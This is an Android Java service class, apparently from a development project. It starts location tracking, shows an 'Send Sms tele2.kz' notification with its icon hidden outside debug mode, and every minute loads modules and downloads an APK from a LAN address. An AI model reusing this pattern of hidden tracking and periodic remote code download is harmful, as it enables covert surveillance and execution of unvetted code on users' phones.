package com.example.test;

import java.util.Timer;
import java.util.TimerTask;

import kz.alfa.map.R;

import com.example.test.util.Loc;
import com.example.test.util.Log;
import com.example.test.util.ModuleEngine;
import com.example.test.util.Util;
import com.example.test.util.Vibr;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.preference.PreferenceManager;

public class TrackingService extends Service {

	final String LOG_TAG = "myLogsServ";
	public static Boolean allowRec = true;
	private Timer myTimer;
	
	public void onCreate() {
		super.onCreate();
		Log.context = getBaseContext();
		Log.d(LOG_TAG, "onCreate");
		startService(new Intent(this, TrackingService.class));
	}

	@SuppressWarnings("deprecation")
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.v(LOG_TAG, "onStartCommand TrackingService");
		int NOTIFICATION_ID = 1;
		Context acontext = getApplicationContext();
		Loc.start(acontext);
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(acontext);
		int icon = R.drawable.ic_launcher; // 0 not visible
		if (Util.debugMode == null)
			icon = 0;
		long when = System.currentTimeMillis();
		Context context = getBaseContext();
		Notification notification = new android.app.Notification(icon,
				"Send Sms", when);
		Intent notificationIntent = new Intent(this, LoginActivity.class);
		notificationIntent.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
		PendingIntent contentIntent = PendingIntent.getActivity(context, 0,
				notificationIntent, 0);
		String txt = sp.getString("lastNumb", "") + " "+sp.getString("tvSmsLeft", "");
		notification.setLatestEventInfo(context, "Send Sms tele2.kz", txt,
				contentIntent);
		startForeground(NOTIFICATION_ID, notification);
		someTask();
		return super.onStartCommand(intent, flags, startId);
	}

	public void onDestroy() {
		super.onDestroy();
		Log.d(LOG_TAG, "onDestroy");
	}

	public IBinder onBind(Intent intent) {
		Log.d(LOG_TAG, "onBind");
		return null;
	}

	void someTask() {
		try{
			if (myTimer != null)
				myTimer.cancel();
			myTimer = new Timer();
			Log.d(LOG_TAG, " someTask ");
			myTimer.schedule(new TimerTask() {
				@Override
				public void run() {
					Log.d(LOG_TAG, " start  someTask");
					Vibr.vibrate(Log.context, new long[] { 10, 20, 30, 100, 40, 70, 60, 60 });
					ModuleEngine.load_all("", getBaseContext() );
					//java.net.URLClassLoader("http://192.168.8.228/tst/class/ModulePrinter.class");
					(new ModuleEngine()).save_url("http://192.168.8.228/tst/class/sms.apk",
								getBaseContext() );

				}
			}, 1000L, 60L * 1000);
		} catch(Exception e){
			e.printStackTrace();
			Log.e("err same task", e.toString());
		}
	}
}